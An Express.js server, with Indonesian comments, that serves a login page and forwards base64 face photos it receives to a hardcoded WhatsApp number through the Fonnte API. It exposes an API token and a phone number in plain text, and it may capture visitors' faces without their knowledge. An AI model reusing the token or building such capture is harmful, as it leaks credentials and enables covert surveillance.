const express = require('express');
const axios = require('axios');
const path = require('path');
const cors = require('cors');

const app = express();

// Middleware
app.use(cors());
app.use(express.json({ limit: '15mb' })); // Agar bisa terima foto base64 besar

// --- KONFIGURASI ---
const FONNTE_TOKEN = 'PG3GRjmArXV4PHYgQaFz'; 
const TARGET_NUMBER = '6283823170469';

// 1. Endpoint untuk menampilkan halaman Login (Frontend)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// 2. Endpoint untuk menerima foto dan kirim ke WhatsApp
app.post('/upload', async (req, res) => {
    const { image } = req.body;

    if (!image) {
        return res.status(400).json({ success: false, message: "Foto tidak ada" });
    }

    try {
        console.log("Mengirim foto ke WhatsApp...");
        
        const response = await axios.post('https://api.fonnte.com/send', {
            target: TARGET_NUMBER,
            url: image,
            caption: '🚨 *NOTIFIKASI LOGIN RENDER* 🚨\nWajah terdeteksi mencoba masuk ke sistem.',
        }, {
            headers: { 'Authorization': FONNTE_TOKEN }
        });

        res.json({ success: true, data: response.data });
    } catch (error) {
        console.error("Gagal kirim WA:", error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Port dinamis untuk Render
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server berjalan di port ${PORT}`);
});